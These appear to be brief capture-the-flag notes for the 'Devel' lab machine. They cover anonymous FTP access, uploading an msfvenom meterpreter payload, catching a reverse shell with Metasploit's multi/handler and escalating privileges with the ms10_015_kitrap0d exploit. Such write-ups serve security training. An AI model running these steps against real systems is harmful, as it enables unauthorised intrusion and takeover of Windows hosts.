# Devel
- nmap
    - Discovered anonymous FTP
        - `ftp 10.10.10.5` user: `anonymous` passowrd: anything.
- msfvenom to build a meterpreter
- upload it via ftp
- start msfconsole to listen
- visit the page to trigger 
```
msf exploit(multi/handler) > search suggest
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > run  
```
## Get a shell
```
msf exploit(windows/local/ms10_015_kitrap0d) > use exploit/multi/handler
msf exploit(multi/handler) > run
```
- Browse the page to spawn the shell
```
meterpreter > background
msf exploit(multi/handler) > sessions
```
## Get an elevated shell
```
msf exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(windows/local/ms10_015_kitrap0d) > show options
msf exploit(windows/local/ms10_015_kitrap0d) > set session 4
msf exploit(windows/local/ms10_015_kitrap0d) > run
meterpreter > shell
c:\windows\system32\inetsrv>whoami
```